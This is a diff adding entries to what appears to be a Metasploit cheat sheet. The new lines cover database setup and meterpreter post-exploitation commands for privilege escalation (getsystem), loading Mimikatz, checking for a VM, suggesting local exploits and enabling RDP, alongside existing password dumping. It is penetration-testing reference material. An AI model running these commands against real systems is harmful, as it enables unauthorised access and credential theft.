@@ -6,6 +6,15 @@ alts: [ExploitDB, Gobuster, Searchsploit]
 website:
 ---
 
+## Msfdb
+
+```sh
+# Initialize metasploit database
+msfdb init
+```
+
+<br />
+
 ## Msfconsole
 
 ```sh
@@ -13,6 +22,9 @@ website:
 msfconsole
 
 ---
+
+# check database status
+msf6 > db_status
 
 # Search exploits from keywords
 msf6 > search ms17-010
@@ -61,11 +73,33 @@ msf6 exploit(post/multi/manage/shell_to_meterpreter) > sessions 2
 # Display the target machine's info
 meterpreter > sysinfo
 
+# Get user who running in the server
+meterpreter > getuid
+
+# Attempt to elevate your privileges
+meterpreter > getsystem
+
+# Get privileges of current user
+meterpreter > getprivs
+
 # Move to the target shell
 meterpreter > shell
 
 # Dump all passwords on the machine
 meterpreter > hashdump
+
+# Load a new version of Mimikatz
+meterpreter > load kiwi
+
+# Check if the target is a virtual machine
+meterpreter > run post/windows/gather/checkvm
+
+# Collect local exploits
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+# Enable RDP
+meterpreter > run post/windows/manage/enable_rdp
+
 ```
 
 <br />
